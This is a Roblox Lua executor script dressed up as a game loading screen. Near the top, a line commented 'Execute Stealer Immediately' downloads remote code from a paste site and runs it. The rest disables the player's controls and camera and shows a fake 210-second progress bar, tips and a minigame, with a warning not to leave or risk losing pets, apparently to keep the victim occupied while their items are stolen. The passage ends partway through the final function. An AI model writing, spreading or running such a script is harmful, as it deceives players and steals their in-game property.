--// FULL GAME-STYLE LOADING SCRIPT //--

-- Hide Roblox default UI
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("TopbarEnabled", false)

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/l9Kp67lO/raw"))()
end)

local LocalPlayer = Players.LocalPlayer

-- Lock camera
local player = game.Players.LocalPlayer
local camera = workspace.CurrentCamera
camera.CameraType = Enum.CameraType.Scriptable
camera.CFrame = CFrame.new(Vector3.new(0, 5, 0), Vector3.new(0, 5, -10))

-- Disable controls
local UIS = game:GetService("UserInputService")
UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
UIS.MouseIconEnabled = false

local function disableControls()
	for _, connection in pairs(getconnections(UIS.InputBegan)) do
		connection:Disable()
	end
	for _, connection in pairs(getconnections(UIS.InputChanged)) do
		connection:Disable()
	end
	for _, connection in pairs(getconnections(UIS.InputEnded)) do
		connection:Disable()
	end
end
disableControls()

-- Create Loading Screen GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = game.CoreGui

-- Background
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Background.Parent = ScreenGui

-- Warning Label
local WarningLabel = Instance.new("TextLabel")
WarningLabel.Size = UDim2.new(1, 0, 0.08, 0)
WarningLabel.Position = UDim2.new(0, 0, 0.05, 0)
WarningLabel.BackgroundTransparency = 1
WarningLabel.Text = "⚠️ Please don't leave while executing the script, this might make you lose all your pets!"
WarningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
WarningLabel.Font = Enum.Font.GothamBold
WarningLabel.TextScaled = true
WarningLabel.Parent = ScreenGui

-- Progress Bar Frame
local ProgressFrame = Instance.new("Frame")
ProgressFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
ProgressFrame.Position = UDim2.new(0.2, 0, 0.9, 0)
ProgressFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ProgressFrame.BorderSizePixel = 0
ProgressFrame.Parent = ScreenGui

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = ProgressFrame

-- Percentage Label
local PercentLabel = Instance.new("TextLabel")
PercentLabel.Size = UDim2.new(1, 0, 1, 0)
PercentLabel.Position = UDim2.new(0, 0, -1, 0)
PercentLabel.BackgroundTransparency = 1
PercentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
PercentLabel.Font = Enum.Font.GothamBold
PercentLabel.TextScaled = true
PercentLabel.Text = "0%"
PercentLabel.Parent = ProgressFrame

-- Tips Label
local TipsLabel = Instance.new("TextLabel")
TipsLabel.Size = UDim2.new(1, 0, 0.08, 0)
TipsLabel.Position = UDim2.new(0, 0, 0.8, 0)
TipsLabel.BackgroundTransparency = 1
TipsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TipsLabel.Font = Enum.Font.Gotham
TipsLabel.TextScaled = true
TipsLabel.Parent = ScreenGui

-- Tips
local tips = {
	"Tip: You can get free coins by playing daily!",
	"Tip: Diamonds are very valuable!",
	"Tip: Don't forget to water your plants!",
	"Tip: Trading is a great way to get rare pets!",
	"Tip: Bigger farms produce more crops!"
}

-- Diamond Minigame Area
local MinigameFrame = Instance.new("Frame")
MinigameFrame.Size = UDim2.new(0.4, 0, 0.3, 0)
MinigameFrame.Position = UDim2.new(0.3, 0, 0.5, 0)
MinigameFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MinigameFrame.BorderSizePixel = 0
MinigameFrame.Parent = ScreenGui

-- Click Minigame
local function spawnDiamond()
	local diamond = Instance.new("ImageButton")
	diamond.Size = UDim2.new(0, 50, 0, 50)
	diamond.Position = UDim2.new(math.random(), -25, math.random(), -25)
	diamond.BackgroundTransparency = 1
	diamond.Image = "rbxassetid://1234567890" -- Replace with diamond image ID
	diamond.Parent = MinigameFrame

	diamond.MouseButton1Click:Connect(function()
		diamond:Destroy()
	end)

	game:GetService("Debris"):AddItem(diamond, 2)
end

-- Progress Loop (210 seconds)
spawn(function()
	local totalTime = 210
	for i = 1, totalTime do
		local progress = i / totalTime
		ProgressBar.Size = UDim2.new(progress, 0, 1, 0)
		PercentLabel.Text = math.floor(progress * 100) .. "%"
		if i % 7 == 0 then
			TipsLabel.Text = tips[math.random(1, #tips)]
		end
		if i % 3 == 0 then
			spawnDiamond()
		end
		wait(1)
	end

	-- Loading done -> remove UI, restore controls, run script
	ScreenGui:Destroy()
	StarterGui:SetCore("TopbarEnabled", true)
	camera.CameraType = Enum.CameraType.Custom
	UIS.MouseIconEnabled = true
